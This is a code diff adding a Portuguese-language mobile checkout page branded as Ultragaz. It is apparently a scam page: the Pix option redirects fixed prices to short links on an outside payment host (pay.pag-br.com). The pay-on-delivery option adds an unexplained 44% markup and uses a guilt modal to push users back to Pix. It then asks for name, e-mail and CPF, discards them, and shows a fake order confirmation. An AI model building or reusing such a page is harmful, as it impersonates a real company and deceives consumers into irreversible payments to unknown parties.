@@ -1,0 +1,1023 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Opções de Pagamento | Ultragaz</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #0055ff;
+            --primary-dark: #0033cc;
+            --primary-light: #e8f0ff;
+            --accent: #00bfff;
+            --success: #28a745;
+            --warning: #ff6b35;
+            --danger: #ff3b30;
+            --text-dark: #1a1a1a;
+            --text-gray: #555;
+            --text-light: #888;
+            --bg-light: #f5f7fa;
+            --bg-white: #ffffff;
+            --border-color: #e0e4e8;
+            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.06);
+            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.12);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: var(--bg-light);
+            color: var(--text-dark);
+            line-height: 1.6;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background-color: var(--bg-white);
+            box-shadow: var(--shadow-md);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ==================== HEADER PROFISSIONAL ==================== */
+        .header {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: var(--bg-white);
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: var(--shadow-md);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex: 1;
+        }
+
+        .back-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: var(--bg-white);
+            font-size: 1.1rem;
+            cursor: pointer;
+            padding: 8px 10px;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+        }
+
+        .back-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateX(-2px);
+        }
+
+        .brand-section {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .brand-logo {
+            font-size: 1.3rem;
+            font-weight: 800;
+            letter-spacing: -1px;
+            line-height: 1;
+        }
+
+        .brand-tagline {
+            font-size: 0.7rem;
+            opacity: 0.9;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .search-btn {
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: var(--bg-white);
+            width: 36px;
+            height: 36px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 1rem;
+        }
+
+        .search-btn:hover {
+            background: rgba(255, 255, 255, 0.25);
+            transform: translateY(-2px);
+        }
+
+        .cart-btn {
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: var(--bg-white);
+            width: 36px;
+            height: 36px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.2s ease;
+            font-size: 1rem;
+        }
+
+        .cart-btn:hover {
+            background: rgba(255, 255, 255, 0.25);
+            transform: translateY(-2px);
+        }
+
+        .cart-badge {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background-color: var(--danger);
+            color: white;
+            font-size: 0.65rem;
+            font-weight: bold;
+            min-width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid var(--bg-white);
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        /* ==================== TRUST BANNER ==================== */
+        .trust-banner {
+            background: linear-gradient(90deg, rgba(40, 167, 69, 0.1) 0%, rgba(0, 191, 255, 0.1) 100%);
+            border-bottom: 1px solid rgba(40, 167, 69, 0.2);
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            gap: 8px;
+            font-size: 0.75rem;
+            color: var(--text-gray);
+            font-weight: 600;
+        }
+
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex: 1;
+            text-align: center;
+            justify-content: center;
+        }
+
+        .trust-item i {
+            color: var(--success);
+            font-size: 1rem;
+        }
+
+        /* ==================== PAYMENT SECTION STYLES ==================== */
+        .review-block {
+            padding: 20px;
+            background-color: var(--bg-white);
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .review-header-bar {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .review-back-btn {
+            background: var(--bg-light);
+            border: none;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: var(--text-dark);
+            transition: all 0.2s ease;
+        }
+
+        .review-back-btn:hover {
+            background: var(--primary-light);
+            color: var(--primary);
+        }
+
+        .review-header-title {
+            font-size: 1.2rem;
+            font-weight: 800;
+            color: var(--text-dark);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .review-header-title i {
+            color: var(--primary);
+        }
+
+        .payment-options-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        /* ==================== IMPROVED PAYMENT DESIGN ==================== */
+        .payment-option-card {
+            border: 2px solid var(--border-color);
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 20px;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            background-color: var(--bg-white);
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .payment-option-card:hover {
+            border-color: var(--primary);
+            transform: translateY(-5px);
+            box-shadow: 0 12px 24px rgba(0, 85, 255, 0.12);
+        }
+
+        .payment-option-card.selected {
+            border: 3px solid var(--primary);
+            background: linear-gradient(135deg, rgba(0, 85, 255, 0.05) 0%, rgba(0, 85, 255, 0.02) 100%);
+            box-shadow: 0 12px 32px rgba(0, 85, 255, 0.18), inset 0 1px 0 rgba(0, 85, 255, 0.1);
+            position: relative;
+        }
+
+        .payment-option-card.selected::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary) 0%, var(--accent) 100%);
+            border-radius: 20px 20px 0 0;
+        }
+
+        .payment-option-card.selected::after {
+            content: '✓';
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            width: 28px;
+            height: 28px;
+            background: var(--primary);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 0.9rem;
+            box-shadow: 0 4px 12px rgba(0, 85, 255, 0.3);
+        }
+
+        .payment-option-card.pix-card {
+            background: linear-gradient(145deg, #f0fffe 0%, #e8fbf8 100%);
+            border: 2px solid #32bcad;
+            box-shadow: 0 8px 24px rgba(50, 188, 173, 0.15);
+            position: relative;
+        }
+
+        .payment-option-card.pix-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, rgba(50, 188, 173, 0.05) 0%, rgba(50, 188, 173, 0.02) 100%);
+            border-radius: 20px;
+            pointer-events: none;
+            animation: pixPulse 3s ease-in-out infinite;
+        }
+
+        .payment-option-card.pix-card:hover {
+            border-color: #32bcad;
+            box-shadow: 0 16px 40px rgba(50, 188, 173, 0.25), inset 0 1px 0 rgba(50, 188, 173, 0.1);
+            transform: translateY(-3px);
+        }
+
+        @keyframes pixPulse {
+            0%, 100% { box-shadow: inset 0 0 0 0 rgba(50, 188, 173, 0.1); }
+            50% { box-shadow: inset 0 0 0 2px rgba(50, 188, 173, 0.15); }
+        }
+
+        .payment-option-card.pix-card.selected {
+            border: 3px solid #32bcad;
+            background: linear-gradient(135deg, rgba(50, 188, 173, 0.12) 0%, rgba(50, 188, 173, 0.05) 100%);
+            box-shadow: 0 16px 48px rgba(50, 188, 173, 0.35), inset 0 1px 0 rgba(50, 188, 173, 0.2);
+            position: relative;
+            animation: pixSelected 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes pixSelected {
+            0% { transform: scale(0.98); }
+            50% { transform: scale(1.01); }
+            100% { transform: scale(1); }
+        }
+
+        .payment-option-card.pix-card.selected::before {
+            background: linear-gradient(90deg, #32bcad 0%, #28a89d 100%);
+            animation: pixGlow 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pixGlow {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .payment-option-card.pix-card.selected::after {
+            background: #32bcad;
+            box-shadow: 0 6px 16px rgba(50, 188, 173, 0.5);
+            animation: pixCheck 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes pixCheck {
+            0% { transform: scale(0) rotate(-45deg); }
+            100% { transform: scale(1) rotate(0deg); }
+        }
+
+        .payment-option-icon {
+            width: 54px;
+            height: 54px;
+            background: var(--primary-light);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.6rem;
+            color: var(--primary);
+            margin-bottom: 4px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0, 85, 255, 0.12);
+        }
+
+        .payment-option-card.selected .payment-option-icon {
+            transform: scale(1.1);
+            box-shadow: 0 6px 16px rgba(0, 85, 255, 0.25);
+        }
+
+        .payment-option-card.pix-card.selected .payment-option-icon {
+            box-shadow: 0 6px 16px rgba(50, 188, 173, 0.3);
+        }
+
+        .pix-card .payment-option-icon {
+            background: linear-gradient(135deg, rgba(50, 188, 173, 0.15) 0%, rgba(50, 188, 173, 0.08) 100%);
+            color: #32bcad;
+            box-shadow: 0 6px 16px rgba(50, 188, 173, 0.2);
+            animation: pixIconPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pixIconPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .payment-option-card.pix-card.selected .payment-option-icon {
+            background: linear-gradient(135deg, rgba(50, 188, 173, 0.2) 0%, rgba(50, 188, 173, 0.12) 100%);
+            transform: scale(1.15);
+            box-shadow: 0 8px 20px rgba(50, 188, 173, 0.35);
+            animation: pixIconSelected 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes pixIconSelected {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1.15); }
+        }
+
+        .payment-option-title {
+            font-weight: 800;
+            font-size: 1.25rem;
+            color: var(--text-dark);
+            margin: 0;
+        }
+
+        .payment-option-price {
+            font-size: 1.8rem;
+            font-weight: 900;
+            color: var(--text-dark);
+            letter-spacing: -0.5px;
+        }
+
+        .pix-card .payment-option-price {
+            color: #32bcad;
+            font-size: 2rem;
+            font-weight: 950;
+        }
+
+        .payment-option-card.pix-card.selected .payment-option-price {
+            color: #32bcad;
+            text-shadow: 0 2px 8px rgba(50, 188, 173, 0.2);
+        }
+
+        .payment-option-desc {
+            font-size: 0.9rem;
+            color: var(--text-gray);
+            line-height: 1.5;
+            margin: 0;
+        }
+
+        .payment-badge-promo {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: linear-gradient(135deg, #32bcad 0%, #28a89d 100%);
+            color: white;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            box-shadow: 0 6px 16px rgba(50, 188, 173, 0.35);
+            letter-spacing: 0.5px;
+            animation: badgePulse 2s ease-in-out infinite;
+        }
+
+        @keyframes badgePulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+
+        .payment-badge-delivery {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: var(--warning);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 800;
+            text-transform: uppercase;
+        }
+
+        .payment-action-btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-weight: 800;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-pay-now {
+            background: #32bcad;
+            color: white;
+        }
+
+        .btn-pay-delivery {
+            background: linear-gradient(135deg, var(--success) 0%, #218838 100%);
+            color: white;
+        }
+
+        /* ==================== CONFIRMATION MODAL ==================== */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            padding: 20px;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-content {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 24px;
+            padding: 30px;
+            position: relative;
+            transform: translateY(20px);
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+        }
+
+        .modal-overlay.active .modal-content {
+            transform: translateY(0);
+        }
+
+        .modal-close-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: #f0f2f5;
+            border: none;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: var(--text-gray);
+            transition: all 0.2s ease;
+        }
+
+        .modal-close-btn:hover {
+            background: #e4e6e9;
+            color: var(--text-dark);
+        }
+
+        .modal-icon {
+            width: 64px;
+            height: 64px;
+            background: rgba(255, 107, 53, 0.1);
+            color: var(--warning);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin: 0 auto 20px;
+        }
+
+        .modal-title {
+            font-size: 1.4rem;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 12px;
+            color: var(--text-dark);
+        }
+
+        .modal-text {
+            text-align: center;
+            color: var(--text-gray);
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .modal-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .btn-modal {
+            width: 100%;
+            padding: 16px;
+            border-radius: 14px;
+            font-weight: 800;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border: none;
+        }
+
+        .btn-modal-pix {
+            background: #32bcad;
+            color: white;
+        }
+
+        .btn-modal-continue {
+            background: #f0f2f5;
+            color: var(--text-gray);
+        }
+
+        .btn-modal-continue:hover {
+            background: #e4e6e9;
+            color: var(--text-dark);
+        }
+
+        /* FORM STYLES IN MODAL */
+        .contact-form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .form-group label {
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: var(--text-dark);
+        }
+
+        .form-group input {
+            padding: 12px 16px;
+            border: 2px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 1rem;
+            transition: all 0.2s ease;
+        }
+
+        .form-group input:focus {
+            border-color: var(--primary);
+            outline: none;
+            background: var(--primary-light);
+        }
+
+        .btn-send-form {
+            background: var(--primary);
+            color: white;
+            margin-top: 10px;
+        }
+
+        .success-icon {
+            width: 64px;
+            height: 64px;
+            background: rgba(40, 167, 69, 0.1);
+            color: var(--success);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.5rem;
+            margin: 0 auto 20px;
+        }
+
+        /* SPINNER */
+        .btn-loading {
+            position: relative;
+            pointer-events: none;
+            opacity: 0.85;
+        }
+
+        .btn-loading .btn-text {
+            visibility: hidden;
+            opacity: 0;
+        }
+
+        .spinner {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            width: 20px;
+            height: 20px;
+            margin-left: -10px;
+            margin-top: -10px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER PROFISSIONAL -->
+        <header class="header">
+            <div class="header-left">
+                <button class="back-btn" title="Voltar">
+                    <i class="fas fa-arrow-left"></i>
+                </button>
+                <div class="brand-section">
+                    <div class="brand-logo">ULTRAGAZ</div>
+                    <div class="brand-tagline">Gás Premium</div>
+                </div>
+            </div>
+            <div class="header-right">
+                <button class="search-btn" title="Buscar">
+                    <i class="fas fa-search"></i>
+                </button>
+                <button class="cart-btn" id="cart-btn" title="Carrinho">
+                    <i class="fas fa-shopping-cart"></i>
+                    <span class="cart-badge" id="cart-badge">1</span>
+                </button>
+            </div>
+        </header>
+
+        <!-- TRUST BANNER -->
+        <div class="trust-banner">
+            <div class="trust-item">
+                <i class="fas fa-lock"></i>
+                <span>100% Seguro</span>
+            </div>
+            <div class="trust-item">
+                <i class="fas fa-check-circle"></i>
+                <span>Garantido</span>
+            </div>
+        </div>
+
+        <!-- MAIN CONTENT WRAPPER -->
+        <div id="cart-content-wrapper">
+            <!-- Payment options will be rendered here by JavaScript -->
+        </div>
+    </div>
+
+    <script>
+        // Mock cart data for demonstration
+        const cart = [{
+            price: 89.47,
+            quantity: 1
+        }];
+
+        function renderPaymentOptions() {
+            const item = cart[0];
+            const baseTotal = item.price * item.quantity;
+            const deliveryTotal = baseTotal * 1.44;
+            let selectedPaymentType = null;
+            
+            const paymentHTML = `
+                <div class="review-block">
+                    <div class="review-header-bar">
+                        <button class="review-back-btn" id="payment-back-btn">
+                            <i class="fas fa-arrow-left"></i>
+                        </button>
+                        <div class="review-header-title"><i class="fas fa-credit-card"></i> Opções de Pagamento</div>
+                    </div>
+                    <div class="payment-options-container">
+                        <div class="payment-option-card pix-card" id="pay-now-pix">
+                            <div class="payment-badge-promo">Desconto Ativo</div>
+                            <div class="payment-option-icon"><i class="fas fa-qrcode"></i></div>
+                            <div class="payment-option-title">Pagar Agora - Pix</div>
+                            <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
+                            <div class="payment-option-desc">Liberação imediata, entrega prioritária e o melhor preço garantido.</div>
+                            <button class="payment-action-btn btn-pay-now" style="margin-top:10px; background: #32bcad; border-radius:12px;"><span class="btn-text">Prosseguir <i class="fas fa-chevron-right"></i></span></button>
+                        </div>
+
+                        <div class="payment-option-card" id="pay-on-delivery">
+                            <div class="payment-badge-delivery">Sem Desconto</div>
+                            <div class="payment-option-icon"><i class="fas fa-truck-ramp-box"></i></div>
+                            <div class="payment-option-title">Pagar na Entrega</div>
+                            <div class="payment-option-price">R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</div>
+                            <div class="payment-option-desc">Pague ao entregador via Cartão ou Dinheiro. (Inclui taxas administrativas)</div>
+                            <button class="payment-action-btn btn-pay-delivery" style="margin-top:10px; border-radius:12px;"><span class="btn-text">Prosseguir <i class="fas fa-chevron-right"></i></span></button>
+                        </div>
+                    </div>
+                </div>
+            `;
+
+            const cartWrapper = document.getElementById('cart-content-wrapper');
+            if (cartWrapper) {
+                cartWrapper.innerHTML = paymentHTML;
+                cartWrapper.scrollTop = 0;
+            }
+
+            document.getElementById('payment-back-btn').addEventListener('click', () => {
+                alert('Voltar clicado');
+            });
+
+            const pixCard = document.getElementById('pay-now-pix');
+            const deliveryCard = document.getElementById('pay-on-delivery');
+            
+            // Two-click logic for PIX
+            pixCard.addEventListener('click', () => {
+                if (selectedPaymentType === 'pix') {
+                    // Second click - proceed with payment
+                    handleFinalPayment('pix');
+                } else {
+                    // First click - select the card
+                    selectedPaymentType = 'pix';
+                    pixCard.classList.add('selected');
+                    deliveryCard.classList.remove('selected');
+                    
+                    // Update button text
+                    const pixBtn = pixCard.querySelector('.payment-action-btn');
+                    pixBtn.innerHTML = '<span class="btn-text">Pagar Agora <i class="fas fa-check"></i></span>';
+                    
+                    // Reset Delivery button
+                    const deliveryBtn = deliveryCard.querySelector('.payment-action-btn');
+                    deliveryBtn.innerHTML = '<span class="btn-text">Selecionar <i class="fas fa-chevron-right"></i></span>';
+                }
+            });
+
+            // Two-click logic for DELIVERY
+            deliveryCard.addEventListener('click', () => {
+                if (selectedPaymentType === 'delivery') {
+                    // Second click - proceed with payment
+                    handleFinalPayment('delivery');
+                } else {
+                    // First click - select the card
+                    selectedPaymentType = 'delivery';
+                    deliveryCard.classList.add('selected');
+                    pixCard.classList.remove('selected');
+                    
+                    // Update button text
+                    const deliveryBtn = deliveryCard.querySelector('.payment-action-btn');
+                    deliveryBtn.innerHTML = '<span class="btn-text">Prosseguir <i class="fas fa-check"></i></span>';
+                    
+                    // Reset PIX button
+                    const pixBtn = pixCard.querySelector('.payment-action-btn');
+                    pixBtn.innerHTML = '<span class="btn-text">Selecionar <i class="fas fa-chevron-right"></i></span>';
+                }
+            });
+        }
+
+        function handleFinalPayment(type) {
+            const item = cart[0];
+            const totalValue = (item.price * item.quantity).toFixed(2);
+            
+            if (type === 'pix') {
+                const pixCard = document.getElementById('pay-now-pix');
+                const pixBtn = pixCard.querySelector('.payment-action-btn');
+                
+                // Adicionar estado de carregamento
+                pixBtn.classList.add('btn-loading');
+                const spinner = document.createElement('div');
+                spinner.className = 'spinner';
+                pixBtn.appendChild(spinner);
+
+                const validPrices = {
+                    '89.47': 'https://pay.pag-br.com/r/7319Hr8M1cK315tl',
+                    '178.94': 'https://pay.pag-br.com/r/yh071U1383Wk13l5BZpn',
+                    '395.47': 'https://pay.pag-br.com/r/1111LIROp5h37A80',
+                    '790.94': 'https://pay.pag-br.com/r/5m1Q38X1hHsC271t156'
+                };
+                
+                if (validPrices[totalValue]) {
+                    setTimeout(() => {
+                        window.location.href = validPrices[totalValue];
+                    }, 800);
+                } else {
+                    setTimeout(() => {
+                        pixBtn.classList.remove('btn-loading');
+                        const spinner = pixBtn.querySelector('.spinner');
+                        if (spinner) spinner.remove();
+                        alert('Erro: Seleção Inválida');
+                    }, 500);
+                }
+            } else {
+                showDeliveryConfirmation(totalValue);
+            }
+        }
+
+        function showDeliveryConfirmation(totalValue) {
+            const modalHTML = `
+                <div class="modal-overlay" id="delivery-modal">
+                    <div class="modal-content" id="delivery-modal-content">
+                        <button class="modal-close-btn" id="modal-close-btn-1">
+                            <i class="fas fa-times"></i>
+                        </button>
+                        <div id="modal-step-1">
+                            <div class="modal-icon"><i class="fas fa-exclamation-triangle"></i></div>
+                            <h3 class="modal-title">Você tem certeza?</h3>
+                            <p class="modal-text">Ao escolher o pagamento na entrega, você <b>perde a promoção exclusiva do Pix</b> e pagará o valor integral sem descontos.</p>
+                            <div class="modal-buttons">
+                                <button class="btn-modal btn-modal-pix" id="modal-back-to-pix">
+                                    <i class="fas fa-qrcode"></i> Quero o desconto do Pix
+                                </button>
+                                <button class="btn-modal btn-modal-continue" id="modal-continue-delivery">
+                                    Continuar sem desconto
+                                </button>
+                            </div>
+                        </div>
+                        <div id="modal-step-2" style="display:none;">
+                            <button class="modal-close-btn" id="modal-close-btn-2">
+                                <i class="fas fa-times"></i>
+                            </button>
+                            <h3 class="modal-title">Dados para Entrega</h3>
+                            <p class="modal-text">Preencha seus dados para finalizarmos seu pedido na entrega.</p>
+                            <form class="contact-form" id="delivery-contact-form">
+                                <div class="form-group">
+                                    <label>Nome Completo</label>
+                                    <input type="text" id="delivery-name" placeholder="Seu nome completo" required>
+                                </div>
+                                <div class="form-group">
+                                    <label>E-mail</label>
+                                    <input type="email" id="delivery-email" placeholder="seu@email.com" required>
+                                </div>
+                                <div class="form-group">
+                                    <label>CPF</label>
+                                    <input type="text" id="delivery-cpf" placeholder="000.000.000-00" required>
+                                </div>
+                                <button type="submit" class="btn-modal btn-send-form">Enviar Pedido</button>
+                            </form>
+                        </div>
+                        <div id="modal-step-3" style="display:none;">
+                            <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+                            <h3 class="modal-title">Pedido Recebido!</h3>
+                            <p class="modal-text">Obrigado! Recebemos sua solicitação de pagamento na entrega. Em breve entraremos em contato para confirmar os detalhes.</p>
+                            <button class="btn-modal btn-modal-continue" id="modal-close-final">Fechar</button>
+                        </div>
+                    </div>
+                </div>
+            `;
+            
+            document.body.insertAdjacentHTML('beforeend', modalHTML);
+            const modal = document.getElementById('delivery-modal');
+            
+            setTimeout(() => modal.classList.add('active'), 10);
+
+            const closeBtn1 = document.getElementById('modal-close-btn-1');
+            if (closeBtn1) {
+                closeBtn1.addEventListener('click', () => {
+                    modal.classList.remove('active');
+                    setTimeout(() => modal.remove(), 300);
+                });
+            }
+
+            const closeBtn2 = document.getElementById('modal-close-btn-2');
+            if (closeBtn2) {
+                closeBtn2.addEventListener('click', () => {
+                    modal.classList.remove('active');
+                    setTimeout(() => modal.remove(), 300);
+                });
+            }
+
+            document.getElementById('modal-back-to-pix').addEventListener('click', () => {
+                modal.classList.remove('active');
+                setTimeout(() => modal.remove(), 300);
+                renderPaymentOptions();
+            });
+
+            document.getElementById('modal-continue-delivery').addEventListener('click', () => {
+                document.getElementById('modal-step-1').style.display = 'none';
+                document.getElementById('modal-step-2').style.display = 'block';
+            });
+
+            document.getElementById('delivery-contact-form').addEventListener('submit', (e) => {
+                e.preventDefault();
+                document.getElementById('modal-step-2').style.display = 'none';
+                document.getElementById('modal-step-3').style.display = 'block';
+            });
+
+            document.getElementById('modal-close-final').addEventListener('click', () => {
+                modal.classList.remove('active');
+                setTimeout(() => {
+                    modal.remove();
+                    location.reload();
+                }, 300);
+            });
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            renderPaymentOptions();
+        });
+    </script>
+</body>
+</html>
